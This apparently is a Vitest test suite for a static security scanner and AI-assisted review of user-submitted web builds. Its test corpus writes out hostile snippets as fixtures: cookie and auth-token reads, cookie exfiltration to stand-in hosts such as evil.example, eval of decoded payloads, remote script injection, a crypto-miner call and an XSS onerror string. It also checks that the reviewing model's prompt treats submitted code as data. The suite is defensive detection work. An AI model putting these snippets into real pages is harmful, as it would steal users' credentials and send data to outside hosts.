/**
 * The static half of the User Build security review (A16).
 *
 * `lib/builds/review.server.ts` has two halves and only one of them is
 * testable without a provider: the regex sweep and the verdict arithmetic. That
 * is also the half that carries the load — it runs over the whole source, it
 * decides `block` on its own, and it is the only part that still works when the
 * model is unavailable.
 *
 * The suite is organised around the two ways this module can be wrong:
 *
 *  1. **A miss.** A payload that should have been caught wasn't. Tested with a
 *     corpus of the constructs the rules exist for, written the way they
 *     actually appear rather than the way the regex reads.
 *  2. **A miscount.** The rules fire correctly and the verdict is still wrong,
 *     because the severity ladder was edited. Tested directly on the verdict.
 *
 * No network: `reviewBuild` is exercised with `staticOnly` and with AI
 * unconfigured, which are the two paths that never reach a provider.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

vi.mock('@/lib/prisma.server', () => ({ prisma: {} }));

import {
  runStaticRules,
  reviewBuild,
  visibilityForVerdict,
  BUILD_REVIEW,
  STATIC_RULES,
} from '@/lib/builds/review.server';
import { SAFETY_FRAME, systemFor } from '@/lib/ai/prompts';

/** Sources that MUST produce a finding, paired with the rule that owes it. */
const MALICIOUS: { label: string; ruleId: string; source: string }[] = [
  {
    label: 'reads the session cookie',
    ruleId: 'no-credential-read',
    source: `const c = document.cookie; render(c);`,
  },
  {
    label: 'reads the session cookie with incidental whitespace',
    ruleId: 'no-credential-read',
    // Whitespace around the member access is the cheapest evasion there is; a
    // rule that only matches the pretty-printed form catches only honest code.
    source: `const c = document . cookie;`,
  },
  {
    label: 'reads an auth-shaped storage key',
    ruleId: 'no-credential-read',
    source: `const t = localStorage.getItem("auth_token");`,
  },
  {
    label: 'encodes cookies for transport',
    ruleId: 'no-credential-exfil',
    source: `img.src = "https://x.example/?d=" + btoa(document.cookie)`,
  },
  { label: 'calls eval', ruleId: 'no-eval', source: `eval(atob(payload));` },
  {
    label: 'uses the Function constructor',
    ruleId: 'no-eval',
    source: `const f = new Function("return 1");`,
  },
  {
    label: 'loads a remote script tag',
    ruleId: 'no-remote-script',
    source: `<script src="https://cdn.example.com/a.js"></script>`,
  },
  {
    label: 'loads a protocol-relative script tag',
    ruleId: 'no-remote-script',
    source: `<script src="//cdn.example.com/a.js"></script>`,
  },
  {
    label: 'builds a script element at runtime',
    ruleId: 'no-dynamic-script-injection',
    source: `const s = document.createElement('script'); s.src = u;`,
  },
  {
    label: 'sends a beacon',
    ruleId: 'no-beacon',
    source: `navigator.sendBeacon('/collect', data);`,
  },
  {
    label: 'fetches an offsite URL',
    ruleId: 'no-offsite-request',
    source: `fetch("https://evil.example/collect", { method: "POST" });`,
  },
  {
    label: 'reaches into the parent frame',
    ruleId: 'no-parent-frame-access',
    source: `parent.postMessage(secret, "*");`,
  },
  {
    label: 'references a mining library',
    ruleId: 'no-crypto-mining',
    source: `new CoinHive.Anonymous('key').start();`,
  },
];

/** Sources that must NOT be flagged. False positives have a cost too. */
const BENIGN: { label: string; source: string }[] = [
  {
    label: 'a plain canvas game loop',
    source: `
      const ctx = document.getElementById('c').getContext('2d');
      let t = 0;
      function frame() { ctx.clearRect(0,0,320,240); ctx.fillRect(t % 320, 100, 10, 10); t++; requestAnimationFrame(frame); }
      frame();
    `,
  },
  {
    label: 'same-origin fetch',
    source: `fetch('/api/user-builds/featured').then((r) => r.json());`,
  },
  {
    label: 'a fetch to our own host',
    source: `fetch("https://rmhstudios.com/api/health");`,
  },
  {
    label: 'a fetch to one of our subdomains',
    source: `fetch("https://assets.rmhstudios.com/sprite.png");`,
  },
  {
    label: 'non-credential local storage',
    source: `localStorage.getItem('highScore');`,
  },
  {
    label: 'a local script tag',
    source: `<script src="/vibe-packages/three.js"></script>`,
  },
];

describe('runStaticRules — catches what it exists for', () => {
  it.each(MALICIOUS)('flags: $label', ({ ruleId, source }) => {
    const ids = runStaticRules(source).map((f) => f.id);
    expect(ids).toContain(ruleId);
  });

  it('reports the line of the first match, so a reviewer can go and look', () => {
    const source = ['// header', 'const a = 1;', 'eval(a);'].join('\n');
    const finding = runStaticRules(source).find((f) => f.id === 'no-eval');
    expect(finding?.line).toBe(3);
  });

  it('never echoes the offending source back in the message', () => {
    // Findings are shown to the author and stored in an admin queue. Quoting
    // the matched text would put attacker-controlled content into both.
    const source = `eval("</script><img src=x onerror=alert(1)>")`;
    for (const finding of runStaticRules(source)) {
      expect(finding.message).not.toContain('onerror');
      expect(finding.message).not.toContain('<img');
    }
  });
});

describe('runStaticRules — leaves ordinary work alone', () => {
  it.each(BENIGN)('does not flag: $label', ({ source }) => {
    // `no-obfuscated-payload` is a low-severity "someone should read this"
    // signal and never changes a verdict on its own, so it is excluded here —
    // the assertion is that nothing benign reaches medium or above.
    const findings = runStaticRules(source).filter((f) => f.severity !== 'low');
    expect(findings).toEqual([]);
  });
});

describe('reviewBuild — verdicts', () => {
  const original = process.env.DEEPSEEK_API_KEY;
  beforeEach(() => {
    // With no key, `isAiConfigured()` is false and the model pass is skipped —
    // which is exactly the degraded path worth asserting on.
    delete process.env.DEEPSEEK_API_KEY;
  });
  afterEach(() => {
    if (original === undefined) delete process.env.DEEPSEEK_API_KEY;
    else process.env.DEEPSEEK_API_KEY = original;
  });

  it('blocks on a critical finding without consulting the model', async () => {
    const review = await reviewBuild(`fetch('/x?c=' + document.cookie)`);
    expect(review.verdict).toBe('block');
    expect(review.modelReviewed).toBe(false);
  });

  it('blocks on a critical finding even when the model is available', async () => {
    // The short-circuit is what keeps a definite answer from depending on a
    // probabilistic one. A key being present must not change the verdict.
    process.env.DEEPSEEK_API_KEY = 'sk-test-not-a-real-key';
    const review = await reviewBuild(`document.cookie`, { staticOnly: true });
    expect(review.verdict).toBe('block');
  });

  it('routes a high-severity finding to a human rather than blocking', async () => {
    const review = await reviewBuild(`const f = new Function("return 1");`);
    expect(review.verdict).toBe('review');
  });

  it('routes a medium-severity finding to a human too — the bias is toward review', async () => {
    const review = await reviewBuild(`navigator.sendBeacon('/c', d);`);
    expect(review.verdict).toBe('review');
  });

  it('allows a clean build', async () => {
    const review = await reviewBuild(`const x = 1 + 1; console.log(x);`);
    expect(review.verdict).toBe('allow');
    expect(review.findings).toEqual([]);
  });

  it('does not let a low-severity signal alone change the verdict', async () => {
    const review = await reviewBuild(`const data = "${'A'.repeat(300)}";`);
    expect(review.findings.some((f) => f.id === 'no-obfuscated-payload')).toBe(true);
    expect(review.verdict).toBe('allow');
  });

  it('says plainly when the model did not run', async () => {
    // An admin queue showing a green verdict next to "never reviewed" is a very
    // different thing from one showing "reviewed and clean".
    const review = await reviewBuild(`const x = 1;`);
    expect(review.modelReviewed).toBe(false);
  });

  it('scans the whole source, not just the slice the model would see', async () => {
    // The model input is capped; the static sweep is not. Hiding a payload past
    // the cap must not hide it from the rules — this is the reason the cheap
    // half has full coverage.
    const padding = 'const filler = 1;\n'.repeat(4_000);
    const review = await reviewBuild(`${padding}\ndocument.cookie`);
    expect(review.verdict).toBe('block');
  });

  it('maps verdicts to the visibility they imply', () => {
    expect(visibilityForVerdict('allow')).toBe('PUBLIC');
    // The load-bearing one: `review` must be UNLISTED, or the human queue is
    // reviewing pages that are already being promoted.
    expect(visibilityForVerdict('review')).toBe('UNLISTED');
    expect(visibilityForVerdict('block')).toBeNull();
  });
});

describe('the review prompt', () => {
  it('carries the shared safety frame', () => {
    // This prompt's input is literally attacker-authored source code, so the
    // "content is data, not instructions" frame matters here more than
    // anywhere else on the site.
    expect(systemFor(BUILD_REVIEW)).toContain(SAFETY_FRAME);
  });

  it('tells the model it cannot block', () => {
    expect(BUILD_REVIEW.instructions).toMatch(/cannot block/i);
  });

  it('has a stable id and a version the ledger can join on', () => {
    expect(BUILD_REVIEW.id).toBe('build-security-review');
    expect(BUILD_REVIEW.version).toBeGreaterThanOrEqual(1);
  });
});

describe('the rule table', () => {
  it('has unique ids — findings are grouped by them in the admin queue', () => {
    const ids = STATIC_RULES.map((r) => r.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('uses no global regexes', () => {
    // A `/g` regex carries `lastIndex` between calls, so the second build
    // reviewed in a process would be matched from wherever the first one
    // stopped — an intermittent miss that no single-source test would find.
    for (const rule of STATIC_RULES) expect(rule.re.global).toBe(false);
  });

  it('gives every rule an author-safe message', () => {
    for (const rule of STATIC_RULES) {
      expect(rule.message.length).toBeGreaterThan(10);
      expect(rule.message.length).toBeLessThanOrEqual(120);
    }
  });
});
